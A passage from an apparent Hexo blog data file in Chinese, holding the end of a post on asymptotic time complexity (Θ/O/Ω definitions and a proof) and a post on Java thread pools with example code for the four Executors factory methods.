(t1+t2)</em>n+t3&#xFF0C;&#x5728;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x4E0B;F(n) = (t1+t2)<em>(n+1)/2+t3*</em></p>\n<hr>\n<h3 id=\"&#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;\"><a href=\"#&#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;\"></a>&#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;</h3><p><strong>&#x4EE5;&#x4E0A;&#x5206;&#x6790;&#xFF0C;&#x6211;&#x4EEC;&#x5BF9;&#x7B97;&#x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;F(n)&#x8FDB;&#x884C;&#x4E86;&#x7CBE;&#x786E;&#x5206;&#x6790;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5F88;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x4E0D;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x5982;&#x6B64;&#x7CBE;&#x786E;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x539F;&#x56E0;&#x6709;&#x4E0B;&#xFF1A;<br>1.&#x5728;&#x8F83;&#x590D;&#x6742;&#x7684;&#x7B97;&#x6CD5;&#x4E2D;&#xFF0C;&#x8FDB;&#x884C;&#x7CBE;&#x786E;&#x5206;&#x6790;&#x662F;&#x975E;&#x5E38;&#x590D;&#x6742;&#x7684;&#x3002;<br>2.&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x5173;&#x5FC3;F(n)&#x7684;&#x7CBE;&#x786E;&#x5EA6;&#x91CF;&#xFF0C;&#x800C;&#x53EA;&#x662F;&#x5173;&#x5FC3;&#x5176;&#x91CF;&#x7EA7;&#x3002;</strong></p>\n<p>&#x57FA;&#x4E8E;&#x6B64;&#xFF0C;&#x63D0;&#x51FA;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x5728;&#x6B63;&#x5F0F;&#x7ED9;&#x51FA;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E4B;&#x524D;&#xFF0C;&#x8981;&#x5148;&#x7ED9;&#x51FA;&#x51E0;&#x4E2A;&#x6570;&#x5B66;&#x5B9A;&#x4E49;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x5B9A;&#x4E49;&#x4E00;&#xFF1A;&#x398;(g(n))={f(n) | &#x5982;&#x679C;&#x5B58;&#x5728;&#x6B63;&#x5E38;&#x6570;c1&#x3001;c2&#x548C;&#x6B63;&#x6574;&#x6570;n0&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&gt;=n0&#x65F6;&#xFF0C;0&lt;c1g(n)&lt;=f(n)&lt;=c2g(n)&#x6052;&#x6210;&#x7ACB;}</span><br><span class=\"line\">&#x5B9A;&#x4E49;&#x4E8C;&#xFF1A;&#x39F;(g(n))={f(n) | &#x5982;&#x679C;&#x5B58;&#x5728;&#x6B63;&#x5E38;&#x6570;c&#x548C;&#x6B63;&#x6574;&#x6570;n0&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&gt;=n0&#x65F6;&#xFF0C;0&lt;=f(n)&lt;=cg(n)&#x6052;&#x6210;&#x7ACB;}</span><br><span class=\"line\">&#x5B9A;&#x4E49;&#x4E09;&#xFF1A;&#x3A9;(g(n))={f(n) | &#x5982;&#x679C;&#x5B58;&#x5728;&#x6B63;&#x5E38;&#x6570;c&#x548C;&#x6B63;&#x6574;&#x6570;n0&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&gt;=n0&#x65F6;&#xFF0C;0&lt;=cg(n)&lt;=f(n)&#x6052;&#x6210;&#x7ACB;}</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x4E09;&#x4E2A;&#x5B9A;&#x4E49;&#x5176;&#x5B9E;&#x90FD;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x96C6;&#x5408;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x51FD;&#x6570;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x7684;&#x6761;&#x4EF6;&#x4E0D;&#x540C;&#x3002;&#x6709;&#x4E86;&#x4EE5;&#x4E0A;&#x5B9A;&#x4E49;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E86;&#x3002;</p>\n<p>&#x4E0D;&#x8FC7;&#x8FD9;&#x91CC;&#x8FD8;&#x6709;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;F(n)&#x4E0D;&#x662F;&#x786E;&#x5B9A;&#x7684;&#xFF0C;&#x4ED6;&#x662F;&#x5728;&#x4E00;&#x4E2A;&#x8303;&#x56F4;&#x5185;&#x53D8;&#x52A8;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5173;&#x5FC3;&#x54EA;&#x4E2A;F(n)&#x5462;&#xFF1F;&#x4E00;&#x822C;&#x6211;&#x4EEC;&#x5728;&#x5206;&#x6790;&#x7B97;&#x6CD5;&#x65F6;&#xFF0C;&#x4F7F;&#x7528;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;&#x7684;F(n)&#x6765;&#x8BC4;&#x4EF7;&#x7B97;&#x6CD5;&#x6548;&#x7387;&#xFF0C;&#x539F;&#x56E0;&#x6709;&#x5982;&#x4E0B;&#x4E24;&#x70B9;&#xFF1A;<br>1.&#x5982;&#x679C;&#x77E5;&#x9053;&#x4E86;&#x6700;&#x574F;&#x60C5;&#x51B5;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x7B97;&#x6CD5;&#x5728;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x90FD;&#x4E0D;&#x80FD;&#x6BD4;&#x8FD9;&#x4E2A;&#x60C5;&#x51B5;&#x66F4;&#x574F;&#x4E86;&#x3002;<br>2.&#x5F88;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x7B97;&#x6CD5;&#x8FD0;&#x884C;&#x53D1;&#x751F;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x7684;&#x6982;&#x7387;&#x8FD8;&#x662F;&#x5F88;&#x5927;&#x7684;&#xFF0C;&#x5982;&#x67E5;&#x627E;&#x95EE;&#x9898;&#x4E2D;&#x5F85;&#x67E5;&#x5143;&#x7D20;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x4E14;&#x5728;&#x5F88;&#x591A;&#x65F6;&#x5019;&#xFF0C;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x548C;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x662F;&#x4E00;&#x4E2A;&#x91CF;&#x7EA7;&#x7684;&#x3002;</p>\n<p>&#x4E8E;&#x662F;&#x7ED9;&#x51FA;&#x5982;&#x4E0B;&#x5B9A;&#x4E49;&#xFF1A;&#x8BBE;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x5728;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;F(n)&#xFF0C;&#x5219;&#x5982;&#x679C;F(n)&#x5C5E;&#x4E8E;&#x398;(g(n))&#xFF0C;&#x5219;&#x8BF4;&#x7B97;&#x6CD5;A&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E3A;g(n)&#xFF0C;&#x4E14;g(n)&#x4E3A;F(n)&#x7684;&#x6E10;&#x8FD1;&#x786E;&#x754C;&#x3002;</p>\n<p>&#x8FD8;&#x662F;&#x4EE5;&#x4E0A;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x4E3A;&#x4F8B;&#xFF0C;&#x5219;&#x5728;&#x4E0A;&#x9762;&#x5B9A;&#x4E49;&#x4E2D;F(n) = (t1+t2)*n+t3&#x3002;&#x5219;F(n)&#x7684;&#x6E10;&#x8FD1;&#x786E;&#x754C;&#x4E3A;n&#xFF0C;&#x5176;&#x8BC1;&#x660E;&#x5982;&#x4E0B;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x8BC1;&#x660E;&#xFF1A;</span><br><span class=\"line\">&#x8BBE;c1=t1+t2&#xFF0C;c2=t1+t2+t3&#xFF0C;n0=2</span><br><span class=\"line\">&#x53C8;&#x56E0;&#x4E3A; t1,t2,t3&#x5747;&#x5927;&#x4E8E;0</span><br><span class=\"line\">&#x5219;&#xFF0C;&#x5F53;n&gt;n0&#x65F6;&#xFF0C;0&lt;c1n&lt;=F(n)&lt;=c2n &#x5373; 0&lt;(t1+t2)*n&lt;=(t1+t2)*n+t3&lt;=(t1+t2+t3)*n&#x6052;&#x6210;&#x7ACB;&#x3002;</span><br><span class=\"line\">&#x6240;&#x4EE5; F(n)&#x5C5E;&#x4E8E;&#x398;(n)</span><br><span class=\"line\">&#x6240;&#x4EE5; n&#x662F;F(n)&#x7684;&#x6E10;&#x8FD1;&#x786E;&#x754C;</span><br><span class=\"line\">&#x8BC1;&#x6BD5;</span><br></pre></td></tr></table></figure></p>\n<p><font style=\"color:red;\">&#x5728;&#x5B9E;&#x9645;&#x5E94;&#x7528;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x4F7F;&#x7528;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4EE3;&#x66FF;&#x5B9E;&#x9645;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x6765;&#x8FDB;&#x884C;&#x7B97;&#x6CD5;&#x6548;&#x7387;&#x5206;&#x6790;&#x3002;</font>&#x4E00;&#x822C;&#x8BA4;&#x4E3A;&#xFF0C;&#x4E00;&#x4E2A;&#x6E10;&#x8FD1;&#x590D;&#x6742;&#x5EA6;&#x4E3A;n&#x7684;&#x7B97;&#x6CD5;&#x8981;&#x4F18;&#x4E8E;&#x6E10;&#x8FD1;&#x590D;&#x6742;&#x5EA6;&#x4E3A;n^2&#x7684;&#x7B97;&#x6CD5;&#x3002;</p>\n<p>&#x6CE8;&#x610F;&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x662F;&#x8BF4;&#x6E10;&#x8FD1;&#x590D;&#x6742;&#x5EA6;&#x4E3A;n&#x7684;&#x7B97;&#x6CD5;&#x5728;&#x4EFB;&#x4F55;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x4E00;&#x5B9A;&#x66F4;&#x9AD8;&#x6548;&#xFF0C;&#x800C;&#x662F;&#x8BF4;&#x5728;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x8DB3;&#x591F;&#x5927;&#x540E;&#xFF08;&#x5927;&#x4E8E;&#x4E34;&#x754C;&#x6761;&#x4EF6;n0&#xFF09;&#xFF0C;&#x5219;&#x524D;&#x4E00;&#x4E2A;&#x7B97;&#x6CD5;&#x7684;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x603B;&#x662F;&#x597D;&#x4E8E;&#x540E;&#x4E00;&#x4E2A;&#x7B97;&#x6CD5;&#x7684;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x3002;&#x4E8B;&#x5B9E;&#x8BC1;&#x660E;&#xFF0C;&#x5728;&#x5B9E;&#x8DF5;&#x4E2D;&#x8FD9;&#x79CD;&#x5206;&#x6790;&#x662F;&#x5408;&#x7406;&#x4E14;&#x6709;&#x6548;&#x7684;&#x3002;</p>\n<p>&#x7C7B;&#x4F3C;&#x7684;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x7ED9;&#x51FA;&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x4E0A;&#x786E;&#x754C;&#x548C;&#x4E0B;&#x786E;&#x754C; &#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x8BBE;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x5728;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;F(n)&#xFF0C;&#x5219;&#x5982;&#x679C;F(n)&#x5C5E;&#x4E8E;&#x39F;(g(n))&#xFF0C;&#x5219;&#x8BF4;&#x7B97;&#x6CD5;A&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E0A;&#x9650;&#x4E3A;g(n)&#xFF0C;&#x4E14;g(n)&#x4E3A;F(n)&#x7684;&#x6E10;&#x8FD1;&#x4E0A;&#x786E;&#x754C;&#x3002;</span><br><span class=\"line\">&#x8BBE;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x5728;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;F(n)&#xFF0C;&#x5219;&#x5982;&#x679C;F(n)&#x5C5E;&#x4E8E;&#x3A9;(g(n))&#xFF0C;&#x5219;&#x8BF4;&#x7B97;&#x6CD5;A&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E0B;&#x9650;&#x4E3A;g(n)&#xFF0C;&#x4E14;g(n)&#x4E3A;F(n)&#x7684;&#x6E10;&#x8FD1;&#x4E0B;&#x786E;&#x754C;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x91CC;&#x4E00;&#x5B9A;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x7531;&#x4E8E;&#x6211;&#x4EEC;&#x662F;&#x4EE5;F(n)&#x6700;&#x574F;&#x60C5;&#x51B5;&#x5206;&#x6790;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;100%&#x4FDD;&#x8BC1;&#x5728;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x8D85;&#x8FC7;&#x4E34;&#x754C;&#x6761;&#x4EF6;n0&#x65F6;&#xFF0C;&#x7B97;&#x6CD5;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E00;&#x5B9A;&#x4E0D;&#x4F1A;&#x9AD8;&#x4E8E;&#x6E10;&#x8FD1;&#x4E0A;&#x786E;&#x754C;&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x80FD;100%&#x4FDD;&#x8BC1;&#x7B97;&#x6CD5;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E0D;&#x4F1A;&#x4F4E;&#x4E8E;&#x6E10;&#x8FD1;&#x4E0B;&#x786E;&#x754C;&#xFF0C;&#x800C;&#x53EA;&#x80FD;100%&#x4FDD;&#x8BC1;&#x7B97;&#x6CD5;&#x7684;&#x6700;&#x574F;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E0D;&#x4F1A;&#x4F4E;&#x4E8E;&#x6E10;&#x8FD1;&#x4E0B;&#x786E;&#x754C;&#x3002;</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>&#x76F8;&#x5173;&#x94FE;&#x63A5;</h3><p>&#x7B97;&#x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x548C;&#x7A7A;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x603B;&#x7ED3;&#xFF1A;<a href=\"http://blog.csdn.net/zolalad/article/details/11848739\">http://blog.csdn.net/zolalad/article/details/11848739</a></p>\n"},{"title":"Java线程池","date":"2016-06-20T10:53:00.000Z","toc":false,"_content":"\n### 为什么要用线程池\n- 减少了创建和销毁线程的次数，每个工作线程都可以被重复利用，可执行多个任务。\n- 可以根据系统的承受能力，调整线程池中工作线线程的数目，防止因为消耗过多的内存，而把服务器累趴下(每个线程需要大约1MB内存，线程开的越多，消耗的内存也就越大，最后死机)。\n\nJava里面线程池的顶级接口是Executor，但是严格意义上讲Executor并不是一个线程池，而只是一个执行线程的工具。真正的线程池接口是ExecutorService。\n\n类名 | 说明 \n---|---\nExecutorService | 真正的线程池接口。\nThreadPoolExecutor | ExecutorService的默认实现。\nScheduledExecutorService | 能和Timer/TimerTask类似，解决那些需要任务重复执行的问题。\nScheduledThreadPoolExecutor | 继承ThreadPoolExecutor的ScheduledExecutorService接口实现，周期性任务调度的类实现。\n\n<!-- more -->\n\n### 常用线程池\n**要配置一个线程池是比较复杂的，尤其是对于线程池的原理不是很清楚的情况下，很有可能配置的线程池不是较优的，因此在Executors类里面提供了一些静态工厂，生成一些常用的线程池。**\n\n- newCachedThreadPool 创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。\n- newFixedThreadPool 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。\n- newScheduledThreadPool 创建一个定长线程池，支持定时及周期性任务执行。\n- newSingleThreadExecutor 创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。\n\n#### 1、newCachedThreadPool\n创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。示例代码如下：\n```\nExecutorService cachedThreadPool = Executors.newCachedThreadPool();\nfor (int i = 0; i < 10; i++) {\n    final int index = i;\n    try { \n        Thread.sleep(index * 1000);\n    } catch (InterruptedException e) {\n        e.printStackTrace();\n    }\n    cachedThreadPool.execute(new Runnable() {\n\n        @Override\n        public void run() {\n            System.out.println(index);\n        }\n    });\n}\n```\n\n线程池为无限大，当执行第二个任务时第一个任务已经完成，会复用执行第一个任务的线程，而不用每次新建线程。\n\n对于需要执行很多短期异步任务的程序来说，缓存线程池可以提高程序性能，因为长时间保持空闲的这种类型的线程池不会占用任何资源，调用缓存线程池对象将重用以前构造的线程（线程可用状态），若线程没有可用的，则创建一个新线程添加到池中，缓存线程池将终止并从池中移除60秒未被使用的线程。\n\n#### 2、newFixedThreadPool\n创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。示例代码如下：\n\n```\nExecutorService fixedThreadPool = Executors.newFixedThreadPool(3);\nfor (int i = 0; i < 10; i++) {\n    final int index = i;\n    fixedThreadPool.execute(new Runnable() {\n\n        @Override\n        public void run() {\n            try {\n                System.out.println(index);\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {\n                // TODO Auto-generated catch block\n                e.printStackTrace();\n            }\n        }\n    });\n}\n```\n因为线程池大小为3，每个任务输出index后sleep 2秒，**所以每两秒打印3个数字**。\n定长线程池的大小最好根据系统资源进行设置。如Runtime.getRuntime().availableProcessors()。可参考PreloadDataCache。\n\n#### 3、newScheduledThreadPool\n创建一个定长线程池，支持定时及周期性任务执行。\n延迟执行示例代码如下：\n\n```\nScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(5);\nscheduledThreadPool.schedule(new Runnable() {\n\n    @Override\n    public void run() {\n        System.out.println(\"delay 3 seconds\");\n    }\n}, 3, TimeUnit.SECONDS);\n```\n**表示延迟3秒执行。**\n\n定期执行示例代码如下：\n```\nscheduledThreadPool.scheduleAtFixedRate(new Runnable() {\n\n    @Override\n    public void run() {\n        System.out.println(\"delay 1 seconds, and excute every 3 seconds\");\n    }\n}, 1, 3, TimeUnit.SECONDS);\n```\n**表示延迟1秒后每3秒执行一次**。\nScheduledExecutorService比Timer更安全，功能更强大。\n参数5指的是线程池中需要保持的线程数，即便这些线程都是空闲的\n\n#### 4、newSingleThreadExecutor\n创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。示例代码如下：\n\n```\nExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();\nfor (int i = 0; i < 10; i++) {\n    final int index = i;\n    singleThreadExecutor.execute(new Runnable() {\n\n        @Override\n        public void run() {\n            try {\n                System.out.println(index);\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {\n                // TODO Auto-generated catch block\n                e.printStackTrace();\n            }\n        }\n    });\n}\n```\n结果依次输出，相当于顺序执行各个任务。\n现行大多数GUI程序都是单线程的。Android中单线程可用于数据库操作，文件操作，应用批量安装，应用批量删除等不适合并发但可能IO阻塞性及影响UI线程响应的操作。","source":"_posts/线程池.md","raw":"---\ntitle: Java线程池\ncategories:\n  - WEB后端\ntags:\n  - 线程池\ndate: 2016-6-20 18:53:00\ntoc: false\n---\n\n### 为什么要用线程池\n- 减少了创建和销毁线程的次数，每个工作线程都可以被重复利用，可执行多个任务。\n- 可以根据系统的承受能力，调整线程池中工作线线程的数目，防止因为消耗过多的内存，而把服务器累趴下(每个线程需要大约1MB内存，线程开的越多，消耗的内存也就越大，最后死机)。\n\nJava里面线程池的顶级接口是Executor，但是严格意义上讲Executor并不是一个线程池，而只是一个执行线程的工具。真正的线程池接口是ExecutorService。\n\n类名 | 说明 \n---|---\nExecutorService | 真正的线程池接口。\nThreadPoolExecutor | ExecutorService的默认实现。\nScheduledExecutorService | 能和Timer/TimerTask类似，解决那些需要任务重复执行的问题。\nScheduledThreadPoolExecutor | 继承ThreadPoolExecutor的ScheduledExecutorService接口实现，周期性任务调度的类实现。\n\n<!-- more -->\n\n### 常用线程池\n**要配置一个线程池是比较复杂的，尤其是对于线程池的原理不是很清楚的情况下，很有可能配置的线程池不是较优的，因此在Executors类里面提供了一些静态工厂，生成一些常用的线程池。**\n\n- newCachedThreadPool 创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。\n- newFixedThreadPool 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。\n- newScheduledThreadPool 创建一个定长线程池，支持定时及周期性任务执行。\n- newSingleThreadExecutor 创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。\n\n#### 1、newCachedThreadPool\n创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。示例代码如下：\n```\nExecutorService cachedThreadPool = Executors.newCachedThreadPool();\nfor (int i = 0; i < 10; i++) {\n    final int index = i;\n    try { \n        Thread.sleep(index * 1000);\n    } catch (InterruptedException e) {\n        e.printStackTrace();\n    }\n    cachedThreadPool.execute(new Runnable() {\n\n        @Override\n        public void run() {\n            System.out.println(index);\n        }\n    });\n}\n```\n\n线程池为无限大，当执行第二个任务时第一个任务已经完成，会复用执行第一个任务的线程，而不用每次新建线程。\n\n对于需要执行很多短期异步任务的程序来说，缓存线程池可以提高程序性能，因为长时间保持空闲的这种类型的线程池不会占用任何资源，调用缓存线程池对象将重用以前构造的线程（线程可用状态），若线程没有可用的，则创建一个新线程添加到池中，缓存线程池将终止并从池中移除60秒未被使用的线程。\n\n#### 2、newFixedThreadPool\n创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。示例代码如下：\n\n```\nExecutorService fixedThreadPool = Executors.newFixedThreadPool(3);\nfor (int i = 0; i < 10; i++) {\n    final int index = i;\n    fixedThreadPool.execute(new Runnable() {\n\n        @Override\n        public void run() {\n            try {\n                System.out.println(index);\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {\n                // TODO Auto-generated catch block\n                e.printStackTrace();\n            }\n        }\n    });\n}\n```\n因为线程池大小为3，每个任务输出index后sleep 2秒，**所以每两秒打印3个数字**。\n定长线程池的大小最好根据系统资源进行设置。如Runtime.getRuntime().availableProcessors()。可参考PreloadDataCache。\n\n#### 3、newScheduledThreadPool\n创建一个定长线程池，支持定时及周期性任务执行。\n延迟执行示例代码如下：\n\n```\nScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(5);\nscheduledThreadPool.schedule(new Runnable() {\n\n    @Override\n    public void run() {\n        System.out.println(\"delay 3 seconds\");\n    }\n}, 3, TimeUnit.SECONDS);\n```\n**表示延迟3秒执行。**\n\n定期执行示例代码如下：\n```\nscheduledThreadPool.scheduleAtFixedRate(new Runnable() {\n\n    @Override\n    public void run() {\n        System.out.println(\"delay 1 seconds, and excute every 3 seconds\");\n    }\n}, 1, 3, TimeUnit.SECONDS);\n```\n**表示延迟1秒后每3秒执行一次**。\nScheduledExecutorService比Timer更安全，功能更强大。\n参数5指的是线程池中需要保持的线程数，即便这些线程都是空闲的\n\n#### 4、newSingleThreadExecutor\n创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。示例代码如下：\n\n```\nExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();\nfor (int i = 0; i < 10; i++) {\n    final int index = i;\n    singleThreadExecutor.execute(new Runnable() {\n\n        @Override\n        public void run() {\n            try {\n                System.out.println(index);\n                Thread.sleep(2000);\n            } catch (InterruptedException e) {\n                // TODO Auto-generated catch block\n                e.printStackTrace();\n            }\n        }\n    });\n}\n```\n结果依次输出，相当于顺序执行各个任务。\n现行大多数GUI程序都是单线程的。Android中单线程可用于数据库操作，文件操作，应用批量安装，应用批量删除等不适合并发但可能IO阻塞性及影响UI线程响应的操作。","slug":"线程池","published":1,"updated":"2016-11-17T11:59:42.682Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulet0052gwtmaxcwnzo5","content":"<h3 id=\"&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\"><a href=\"#&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\" class=\"headerlink\" title=\"&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;\"></a>&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528;&#x7EBF;&#x7A0B;&#x6C60;</h3><ul>\n<li>&#x51CF;&#x5C11;&#x4E86;&#x521B;&#x5EFA;&#x548C;&#x9500;&#x6BC1;&#x7EBF;&#x7A0B;&#x7684;&#x6B21;&#x6570;&#xFF0C;&#x6BCF;&#x4E2A;&#x5DE5;&#x4F5C;&#x7EBF;&#x7A0B;&#x90FD;&#x53EF;&#x4EE5;&#x88AB;&#x91CD;&#x590D;&#x5229;&#x7528;&#xFF0C;&#x53EF;&#x6267;&#x884C;&#x591A;&#x4E2A;&#x4EFB;&#x52A1;&#x3002;</li>\n<li>&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x7CFB;&#x7EDF;&#x7684;&#x627F;&#x53D7;&#x80FD;&#x529B;&#xFF0C;&#x8C03;&#x6574;&#x7EBF;&#x7A0B;&#x6C60;&#x4E2D;&#x5DE5;&#x4F5C;&#x7EBF;&#x7EBF;&#x7A0B;&#x7684;&#x6570;&#x76EE;&#xFF0C;&#x9632;&#x6B62;&#x56E0;&#x4E3A;&#x6D88;&#x8017;&#x8FC7;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x800C;&#x628A;&#x670D;&#x52A1;&#x5668;&#x7D2F;&#x8DB4;&#x4E0B;(&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x9700;&#x8981;&#x5927;&#x7EA6;1MB&#x5185;&#x5B58;&#xFF0C;&#x7EBF;&#x7A0B;&#x5F00;&#x7684;&#x8D8A;&#x591A;&#xFF0C;&#x6D88;&#x8017;&#x7684;&#x5185;&#x5B58;&#x4E5F;&#x5C31;&#x8D8A;&#x5927;&#xFF0C;&#x6700;&#x540E;&#x6B7B;&#x673A;)&#x3002;</li>\n</ul>\n<p>Java&#x91CC;&#x9762;&#x7EBF;&#x7A0B;&#x6C60;&#x7684;&#x9876;&#x7EA7;&#x63A5;&#x53E3;&#x662F;Executor&#xFF0C;&#x4F46;&#x662F;&#x4E25;&#x683C;&#x610F;&#x4E49;&#x4E0A;&#x8BB2;Executor&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6C60;&#xFF0C;&#x800C;&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x6267;&#x884C;&#x7EBF;&#x7A0B;&#x7684;&#x5DE5;&#x5177;&#x3002;&#x771F;&#x6B63;&#